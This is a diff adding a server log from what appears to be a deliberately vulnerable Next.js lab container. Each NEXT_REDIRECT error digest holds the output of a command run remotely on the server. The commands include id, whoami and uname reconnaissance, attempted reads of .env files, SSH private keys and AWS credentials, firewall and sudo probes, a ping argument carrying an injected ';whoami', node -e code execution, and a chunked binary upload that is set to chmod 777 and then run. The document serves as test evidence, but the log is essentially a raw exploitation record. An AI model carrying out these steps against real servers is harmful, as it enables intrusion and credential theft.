@@ -1,0 +1,149 @@
+[Instrumentation] Logging initialized. Writing to: /app/logs/server.unsafe.log
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"id","args":[],"stdout":"uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\\n","stderr":"","status":0,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"whoami","args":[],"stdout":"root\\n","stderr":"","status":0,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"uname","args":["-a"],"stdout":"Linux ace472cc5047 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64 Linux\\n","stderr":"","status":0,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"pwd","args":[],"stdout":"/app\\n","stderr":"","status":0,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"ls","args":["-la"],"stdout":"total 300\\ndrwxr-xr-x    1 root     root          4096 Dec 19 23:54 .\\ndrwxr-xr-x    1 root     root          4096 Dec 19 23:54 ..\\ndrwxr-xr-x    1 root     root          4096 Dec 19 04:25 .next\\n-rwxr-xr-x    1 root     root          1486 Dec 19 04:25 README.md\\n-rwxr-xr-x    1 root     root           793 Dec 19 04:25 UNSAFE_Dockerfile\\ndrwxr-xr-x    3 root     root          4096 Dec 19 04:25 app\\n-rwxr-xr-x    1 root     root           483 Dec 19 04:25 eslint.config.mjs\\n-rwxr-xr-x    1 root     root          1171 Dec 19 04:25 instrumentation.ts\\ndrwxr-xr-x    2 root     root          4096 Dec 19 04:25 lib\\ndrwxrwxrwx    1 root     root           512 Dec 19 23:54 logs\\n-rwxr-xr-x    1 root     root           252 Dec 19 04:25 next.config.ts\\ndrwxr-xr-x   13 root     root          4096 Dec 19 04:25 node_modules\\n-rwxr-xr-x    1 root     root        237067 Dec 19 04:25 package-lock.json\\n-rwxr-xr-x    1 root     root           617 Dec 19 04:25 package.json\\n-rwxr-xr-x    1 root     root           101 Dec 19 04:25 postcss.config.mjs\\ndrwxr-xr-x    1 root     root          4096 Dec 14 13:03 public\\n-rw-r--r--    1 root     root          6330 Dec 19 04:25 server.js\\n-rwxr-xr-x    1 root     root           700 Dec 19 04:25 tsconfig.json\\n","stderr":"","status":0,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":[".env"],"stdout":"","stderr":"cat: can\'t open \'.env\': No such file or directory\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":[".env.local"],"stdout":"","stderr":"cat: can\'t open \'.env.local\': No such file or directory\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":[".env.production"],"stdout":"","stderr":"cat: can\'t open \'.env.production\': No such file or directory\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":[".env.development"],"stdout":"","stderr":"cat: can\'t open \'.env.development\': No such file or directory\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["../.env"],"stdout":"","stderr":"cat: can\'t open \'../.env\': No such file or directory\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["/app/.env"],"stdout":"","stderr":"cat: can\'t open \'/app/.env\': No such file or directory\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["~/.ssh/id_rsa"],"stdout":"","stderr":"cat: can\'t open \'~/.ssh/id_rsa\': No such file or directory\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["~/.ssh/id_ed25519"],"stdout":"","stderr":"cat: can\'t open \'~/.ssh/id_ed25519\': No such file or directory\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["~/.ssh/authorized_keys"],"stdout":"","stderr":"cat: can\'t open \'~/.ssh/authorized_keys\': No such file or directory\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["/root/.ssh/id_rsa"],"stdout":"","stderr":"cat: can\'t open \'/root/.ssh/id_rsa\': No such file or directory\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["/root/.ssh/authorized_keys"],"stdout":"","stderr":"cat: can\'t open \'/root/.ssh/authorized_keys\': No such file or directory\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["~/.aws/credentials"],"stdout":"","stderr":"cat: can\'t open \'~/.aws/credentials\': No such file or directory\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["~/.aws/config"],"stdout":"","stderr":"cat: can\'t open \'~/.aws/config\': No such file or directory\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["/root/.aws/credentials"],"stdout":"","stderr":"cat: can\'t open \'/root/.aws/credentials\': No such file or directory\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["/root/.aws/config"],"stdout":"","stderr":"cat: can\'t open \'/root/.aws/config\': No such file or directory\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"curl","args":["-fsSL","https://www.google.com"],"error":"Command not found","message":"spawnSync curl ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"wget","args":["-qO-","https://www.google.com"],"stdout":"<!doctype html><html itemscope=\\"\\" itemtype=\\"http://schema.org/WebPage\\" lang=\\"id\\"><head><meta content=\\"text/html; charset=UTF-8\\" http-equiv=\\"Content-Type\\"><meta content=\\"/images/branding/googleg/1x/googleg_standard_color_128dp.png\\" itemprop=\\"image\\"><title>Google</title><script nonce=\\"S3NFWws5CIAmXgS3Hves5A\\">(function(){var _g={kEI:\'veVFadJ3poPj4Q-_kcH4DQ\',kEXPI:\'0,203004,45,1101175,7,2935814,48791,30022,16105,344796,5532595,1,234,45,36811493,25228681,152379,65170,30632,9139,4600,6553,64165,15098,8157,37804,28340,48897,38125,20804,12581,927,4,3788,21511,3590,22001,36973,9366,20677,200,1020,4372,4532,1760,16179,2747,2,4,1,16802,2305,313,19223,1196,187,4,1514,3355,197,570,2591,2652,2,4205,7,1787,16,9907,4384,2,876,2229,5089,19,3007,27,769,368,8784,14102,12330,1039,1034,1202,3101,845,2047,1,1,2,12,430,1128,3,2842,9,27,8,3055,1012,1745,4,4635,10558,4,2171,72,241,296,5,1113,389,4,299,2264,84,5,2703,2116,15,164,570,298,4309,3592,720,632,1275,7,2788,52,2,2334,93,2329,1177,2528,1250,4,82,2572,2,5724,9,602,1649,4,1882,6,2,2,2,676,816,2135,1669,251,483,746,5,1234,1,2,1081,16,6,56,243,3,887,233,239,3,81,2059,3,2788,49,10,215,441,797,1008,223,1900,1638,544,4,27,5,767,882,921,1296,5,97,187,259,90,514,1242,5,259,5,197,1050,1316,19,293,1154,93,4,235,1189,208,392,4,336,368,1995,5,568,6,154,5,1554,4,443,24,1161,1488,512,141,398,4,586,4,642,815,114,260,5,1294,1064,716,3,2,815,199,816,138,4,951,326,501,4,32,4,448,6,393,11,520,611,23,238,453,4,3,37,4,1671,295,6,552,6,6,16,323,1,587,226,1114,12,61,506,1959,906,77,4,216,776,16,2,50,65,3,2,2,2,147,4,868,389,683,4,212,794,48,4,157,1,72,4,12,1,164,22,71,4,54,364,297,377,2,94,240,1,142,2,4,406,138,5,396,262,2,14,473,78,70,67,100,417,1360,657,4,730,52,4,38,297,1,2,1117,697,5,1189,3,34,73,45,389,13,171,539,100,298,12,22,4,589,157,4,1468,829,124,10,6,810,298,2,928,360,110,16,463,610,382,318,2429,3,2,2,2,97,398,720,21017528,5,2992,4,2960,3,2022,2077,4392,2,1558,3,9387,3791,1695,52,1143,3,746,6,1064,85,3,1310,2,4,2,1544,918,1172,626,4,438,363,275,282,3,87,609,42,1198,6491329,2532,2,312,384,115542,2438384,1077914,915035,93986,10496396,4,606200,1,8287,1,3,134230,61374\',kBL:\'dfr-\',kOPI:89978449};(function(){var a;((a=window.google)==null?0:a.stvsc)?google.kEI=_g.kEI:window.google=_g;}).call(this);})();(function(){google.sn=\'webhp\';google.kHL=\'id\';google.rdn=false;})();(function(){\\nvar g=this||self;function k(){return window.google&&window.google.kOPI||null};var l,m=[];function n(a){for(var b;a&&(!a.getAttribute||!(b=a.getAttribute(\\"eid\\")));)a=a.parentNode;return b||l}function p(a){for(var b=null;a&&(!a.getAttribute||!(b=a.getAttribute(\\"leid\\")));)a=a.parentNode;return b}function q(a){/^http:/i.test(a)&&window.location.protocol===\\"https:\\"&&(google.ml&&google.ml(Error(\\"a\\"),!1,{src:a,glmm:1}),a=\\"\\");return a}\\nfunction r(a,b,d,c,h){var e=\\"\\";b.search(\\"&ei=\\")===-1&&(e=\\"&ei=\\"+n(c),b.search(\\"&lei=\\")===-1&&(c=p(c))&&(e+=\\"&lei=\\"+c));var f=b.search(\\"&cshid=\\")===-1&&a!==\\"slh\\";c=\\"&zx=\\"+Date.now().toString();g._cshid&&f&&(c+=\\"&cshid=\\"+g._cshid);(d=d())&&(c+=\\"&opi=\\"+d);return\\"/\\"+(h||\\"gen_204\\")+\\"?atyp=i&ct=\\"+String(a)+\\"&cad=\\"+(b+e+c)};l=google.kEI;google.getEI=n;google.getLEI=p;google.ml=function(){return null};google.log=function(a,b,d,c,h,e){e=e===void 0?k:e;d||(d=r(a,b,e,c,h));if(d=q(d)){a=new Image;var f=m.length;m[f]=a;a.onerror=a.onload=a.onabort=function(){delete m[f]};a.src=d}};google.logUrl=function(a,b){b=b===void 0?k:b;return r(\\"\\",a,b)};}).call(this);(function(){google.y={};google.sy={};function e(a,b,c){if(a)var d=a.id;else{do d=Math.random();while(c[d])}c[d]=[a,b]}var f;(f=google).x||(f.x=function(a,b){e(a,b,google.y)});var g;(g=google).sx||(g.sx=function(a,b){e(a,b,google.sy)});google.lm=[];var h;(h=google).plm||(h.plm=function(a){google.lm.push.apply(google.lm,a)});google.lq=[];var k;(k=google).load||(k.load=function(a,b,c){google.lq.push([[a],b,c])});var l;(l=google).loadAll||(l.loadAll=function(a,b){google.lq.push([a,b])});google.bx=!1;var m;(m=google).lx||(m.lx=function(){});var n=[],p;(p=google).fce||(p.fce=function(a,b,c,d){n.push([a,b,c,d])});google.qce=n;google.adl=[];}).call(this);google.f={};(function(){\\ndocument.documentElement.addEventListener(\\"submit\\",function(b){var a;if(a=b.target){var c=a.getAttribute(\\"data-submitfalse\\");a=c===\\"1\\"||c===\\"q\\"&&!a.elements.q.value?!0:!1}else a=!1;a&&(b.preventDefault(),b.stopPropagation())},!0);document.documentElement.addEventListener(\\"click\\",function(b){var a;a:{for(a=b.target;a&&a!==document.documentElement;a=a.parentElement)if(a.tagName===\\"A\\"){a=a.getAttribute(\\"data-nohref\\")===\\"1\\";break a}a=!1}a&&b.preventDefault()},!0);}).call(this);</script><script nonce=\\"S3NFWws5CIAmXgS3Hves5A\\">;this.gbar_={CONFIG:[[[0,\\"www.gstatic.com\\",\\"og.qtm.en_US.6aaEaMbl5bA.es5.O\\",\\"co.id\\",\\"id\\",\\"538\\",0,[4,2,\\"\\",\\"\\",\\"\\",\\"845139168\\",\\"0\\"],null,\\"veVFaZbwAceA4-EPhJ7ogQY\\",null,0,\\"og.qtm.DnccEEQjR4M.L.X.O\\",\\"AA2YrTuPFEoPJHD12rR0JOrQXMQrWhdz2g\\",\\"AA2YrTuVGvWmH6g6Te7K1XYnxhzafLZlbQ\\",\\"\\",2,1,200,\\"IDN\\",null,null,\\"1\\",\\"538\\",1,null,null,89978449,null,0,0],null,[1,0.1000000014901161,2,1],null,[0,0,0,null,\\"\\",\\"\\",\\"\\",\\"\\",0,0,null,\\"\\"],[0,0,\\"\\",1,0,0,0,0,0,0,null,0,0,null,0,0,null,null,0,0,0,\\"\\",\\"\\",\\"\\",\\"\\",\\"\\",\\"\\",null,0,0,0,0,0,null,null,null,\\"rgba(32,33,36,1)\\",\\"rgba(255,255,255,1)\\",0,0,1,null,null,null,0],null,null,[\\"1\\",\\"gci_91f30755d6a6b787dcc2a4062e6e9824.js\\",\\"googleapis.client:gapi.iframes\\",\\"\\",\\"id\\"],null,null,null,null,[\\"m;/_/scs/abc-static/_/js/k=gapi.gapi.en.FZb77tO2YW4.O/d=1/rs=AHpOoo8lqavmo6ayfVxZovyDiP6g3TOVSQ/m=__features__\\",\\"https://apis.google.com\\",\\"\\",\\"\\",\\"\\",\\"\\",null,1,\\"es_plusone_gc_20251208.0_p0\\",\\"id\\",null,0],[0.009999999776482582,\\"co.id\\",\\"538\\",[[\\"19046229\\",\\"19046228\\",\\"7\\",1,5,2592000,\\"\\",\\"AN2NJM7zTp6VxZqKZFGOXUqmnFjuMwufSg:1766188477032\\",0,1,2,\\"https://www.google.com/_/og/promos/\\",0],\\"n\\",\\"\\",[\\"\\",\\"\\",\\"\\"],1,2592000,null,null,\\"https://www.google.com/url?q=https://accounts.google.com/signin/v2/identifier%3Fec%3Dfutura_hpp_co_si_001_p%26continue%3Dhttps%253A%252F%252Fwww.google.com%252F%253Fptid%253D19027681%2526ptt%253D8%2526fpts%253D0\\\\u0026source=hpp\\\\u0026id=19046229\\\\u0026ct=7\\\\u0026usg=AOvVaw33MBGJMT3TA0n4WMEDSPEO\\",null,null,null,null,null,1,null,0,null,1,0,0,0,null,null,0,0,null,0,0,0,0,1],null,null,null,0],[1,null,null,27043,538,\\"IDN\\",\\"id\\",\\"845139168.0\\",8,null,0,0,null,null,null,null,\\"3700949,3701384,102772546,103291645\\",null,null,null,\\"veVFaZbwAceA4-EPhJ7ogQY\\",1,0,0,null,2,5,\\"sl\\",30,0,0,null,null,1,89978449,1,0],[[null,null,null,\\"https://www.gstatic.com/og/_/js/k=og.qtm.en_US.6aaEaMbl5bA.es5.O/rt=j/m=qabr,q_d,qapid,qald,qads,q_dg/exm=qaaw,qadd,qaid,qein,qhaw,qhba,qhbr,qhch,qhga,qhid,qhin/d=1/ed=1/rs=AA2YrTuPFEoPJHD12rR0JOrQXMQrWhdz2g\\"],[null,null,null,\\"https://www.gstatic.com/og/_/ss/k=og.qtm.DnccEEQjR4M.L.X.O/m=d_b_gm3,d_wi_gm3,d_lo_gm3/excm=qaaw,qadd,qaid,qein,qhaw,qhba,qhbr,qhch,qhga,qhid,qhin/d=1/ed=1/ct=zgms/rs=AA2YrTuVGvWmH6g6Te7K1XYnxhzafLZlbQ\\"]]]],};this.gbar_=this.gbar_||{};(function(_){var window=this;\\ntry{\\n_._F_toggles_initialize=function(a){(typeof globalThis!==\\"undefined\\"?globalThis:typeof self!==\\"undefined\\"?self:this)._F_toggles_gbar_=a||[]};(0,_._F_toggles_initialize)([]);\\n/*\\n\\n Copyright The Closure Library Authors.\\n SPDX-License-Identifier: Apache-2.0\\n*/\\nvar ia,oa,qa,ua,wa,xa,La,Ma,eb,hb,jb,ob,kb,rb,wb,Ib,Jb,Kb,Lb,Mb,Ub,Vb,Xb,Yb;_.aa=function(a,b){if(Error.captureStackTrace)Error.captureStackTrace(this,_.aa);else{var c=Error().stack;c&&(this.stack=c)}a&&(this.message=String(a));b!==void 0&&(this.cause=b)};_.ba=function(a){a.Jm=!0;return a};\\n_.ha=function(a){var b=a;if(ca(b)){if(!/^\\\\s*(?:-?[1-9]\\\\d*|0)?\\\\s*$/.test(b))throw Error(String(b));}else if(da(b)&&!Number.isSafeInteger(b))throw Error(String(b));return ea?BigInt(a):a=fa(a)?a?\\"1\\":\\"0\\":ca(a)?a.trim()||\\"0\\":String(a)};ia=function(a,b){if(a.length>b.length)return!1;if(a.length<b.length||a===b)return!0;for(var c=0;c<a.length;c++){var d=a[c],e=b[c];if(d>e)return!1;if(d<e)return!0}};_.ja=function(a){_.t.setTimeout(function(){throw a;},0)};\\n_.la=function(){return _.ka().toLowerCase().indexOf(\\"webkit\\")!=-1};_.ka=function(){var a=_.t.navigator;return a&&(a=a.userAgent)?a:\\"\\"};oa=function(a){if(!ma||!na)return!1;for(var b=0;b<na.brands.length;b++){var c=na.brands[b].brand;if(c&&c.indexOf(a)!=-1)return!0}return!1};_.pa=function(a){return _.ka().indexOf(a)!=-1};qa=function(){return ma?!!na&&na.brands.length>0:!1};_.ra=function(){return qa()?!1:_.pa(\\"Opera\\")};_.sa=function(){return qa()?!1:_.pa(\\"Trident\\")||_.pa(\\"MSIE\\")};\\n_.ta=function(){return _.pa(\\"Firefox\\")||_.pa(\\"FxiOS\\")};_.va=function(){return _.pa(\\"Safari\\")&&!(ua()||(qa()?0:_.pa(\\"Coast\\"))||_.ra()||(qa()?0:_.pa(\\"Edge\\"))||(qa()?oa(\\"Microsoft Edge\\"):_.pa(\\"Edg/\\"))||(qa()?oa(\\"Opera\\"):_.pa(\\"OPR\\"))||_.ta()||_.pa(\\"Silk\\")||_.pa(\\"Android\\"))};ua=function(){return qa()?oa(\\"Chromium\\"):(_.pa(\\"Chrome\\")||_.pa(\\"CriOS\\"))&&!(qa()?0:_.pa(\\"Edge\\"))||_.pa(\\"Silk\\")};wa=function(){return ma?!!na&&!!na.platform:!1};xa=function(){return _.pa(\\"iPhone\\")&&!_.pa(\\"iPod\\")&&!_.pa(\\"iPad\\")};\\n_.ya=function(){return xa()||_.pa(\\"iPad\\")||_.pa(\\"iPod\\")};_.za=function(){return wa()?na.platform===\\"macOS\\":_.pa(\\"Macintosh\\")};_.Ba=function(a,b){return(0,_.Aa)(a,b)>=0};_.Ca=function(a,b,c){return typeof Symbol===\\"function\\"&&typeof Symbol()===\\"symbol\\"?(c===void 0?0:c)&&Symbol.for&&a?Symbol.for(a):a!=null?Symbol(a):Symbol():b};_.Ga=function(a,b){_.Da||_.v in a||Ea(a,Fa);a[_.v]|=b};_.Ha=function(a,b){_.Da||_.v in a||Ea(a,Fa);a[_.v]=b};\\n_.Ja=function(a,b){return b===void 0?a.j!==Ia&&!!(2&(a.J[_.v]|0)):!!(2&b)&&a.j!==Ia};La=function(a){return a};Ma=function(a,b){a.__closure__error__context__984382||(a.__closure__error__context__984382={});a.__closure__error__context__984382.severity=b};_.Na=function(a){a=Error(a);Ma(a,\\"warning\\");return a};_.Pa=function(a,b){if(a!=null){var c;var'... 69981 more characters
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"iptables","args":["-L"],"error":"Command not found","message":"spawnSync iptables ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"ufw","args":["status"],"error":"Command not found","message":"spawnSync ufw ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"systemctl","args":["status","ssh"],"error":"Command not found","message":"spawnSync systemctl ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"sudo","args":["-n","true"],"error":"Command not found","message":"spawnSync sudo ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"ping","args":["-c","1","8.8.8.8;","whoami"],"stdout":"","stderr":"BusyBox v1.37.0 (2025-12-16 14:19:28 UTC) multi-call binary.\\n\\nUsage: ping [OPTIONS] HOST\\n\\nSend ICMP ECHO_REQUESTs to HOST\\n\\n\\t-4,-6\\t\\tForce IP or IPv6 name resolution\\n\\t-c CNT\\t\\tSend only CNT pings\\n\\t-s SIZE\\t\\tSend SIZE data bytes in packets (default 56)\\n\\t-i SECS\\t\\tInterval\\n\\t-A\\t\\tPing as soon as reply is received\\n\\t-t TTL\\t\\tSet TTL\\n\\t-I IFACE/IP\\tSource interface or IP address\\n\\t-W SEC\\t\\tSeconds to wait for the first response (default 10)\\n\\t\\t\\t(after all -c CNT packets are sent)\\n\\t-w SEC\\t\\tSeconds until ping exits (default:infinite)\\n\\t\\t\\t(can exit earlier with -c CNT)\\n\\t-q\\t\\tQuiet, only display output at start/finish\\n\\t-p HEXBYTE\\tPayload pattern\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"node","args":["-e","console.log(\'hello from Node.js RCE\');"],"stdout":"hello from Node.js RCE\\n","stderr":"","status":0,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"node","args":["-e","require(\'axios\').get(\'https://www.google.com\').then(res => console.log(res.status)).catch(err => console.error(err.message));"],"stdout":"","stderr":"node:internal/modules/cjs/loader:1210\\n  throw err;\\n  ^\\n\\nError: Cannot find module \'axios\'\\nRequire stack:\\n- /app/[eval]\\n    at Module._resolveFilename (node:internal/modules/cjs/loader:1207:15)\\n    at Module._load (node:internal/modules/cjs/loader:1038:27)\\n    at Module.require (node:internal/modules/cjs/loader:1289:19)\\n    at require (node:internal/modules/helpers:182:18)\\n    at [eval]:1:1\\n    at runScriptInThisContext (node:internal/vm:209:10)\\n    at node:internal/process/execution:118:14\\n    at [eval]-wrapper:6:24\\n    at runScript (node:internal/process/execution:101:62)\\n    at evalScript (node:internal/process/execution:133:3) {\\n  code: \'MODULE_NOT_FOUND\',\\n  requireStack: [ \'/app/[eval]\' ]\\n}\\n\\nNode.js v20.19.6\\n","status":1,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"Pre-run Cleanup","success":true}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"1. Write Initial Chunk to /tmp/hello_test","success":true}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"1.1 Append Chunk to /tmp/hello_test","success":true}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"1.2 Append Chunk to /tmp/hello_test","success":true}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"2. Verify Binary was Written","verification":{"dev":125,"mode":33188,"nlink":1,"uid":0,"gid":0,"rdev":0,"blksize":4096,"ino":318406,"size":1228952,"blocks":2408,"atimeMs":1766188478090.137,"mtimeMs":1766188478137.197,"ctimeMs":1766188478137.197,"birthtimeMs":1766188478090.137,"atime":"2025-12-19T23:54:38.090Z","mtime":"2025-12-19T23:54:38.137Z","ctime":"2025-12-19T23:54:38.137Z","birthtime":"2025-12-19T23:54:38.090Z"},"success":true}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"3. Chmod Binary to 777","success":true}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"4. Execute Binary","stdout":"Hello from Go binary!\\n","stderr":"","error_obj":null,"success":true}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"Post-run Cleanup","success":true}`'
+}
